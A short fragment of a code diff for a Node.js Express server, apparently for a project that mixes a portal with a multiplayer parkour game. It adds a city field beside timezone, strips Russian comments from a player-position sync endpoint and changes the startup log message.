             timezone: req.body.timezone,
+            city: req.body.city,
             time: new Date().toLocaleTimeString()
         };
         currentTrap = null;
@@ -1009,15 +1042,14 @@ app.post('/api/parkour/sync', (req, res) => {
         x: x || 0,
         y: y || 0,
         z: z || 0,
-        rx: rx || 0, // наклон головы
-        ry: ry || 0, // поворот тела
+        rx: rx || 0, 
+        ry: ry || 0, 
         lastSeen: Date.now()
     };
 
-    // Отправляем в ответ координаты всех остальных игроков
     res.json(onlinePlayers);
 });
 
 app.listen(PORT, () => {
-    console.log(`[CtalkeP] Портал и Паркур запущены на порту: ${PORT}`);
+    console.log(`[CtalkeP] Система перезапущена. Ошибки коллизий и геопозиционирования устранены.`);
 });
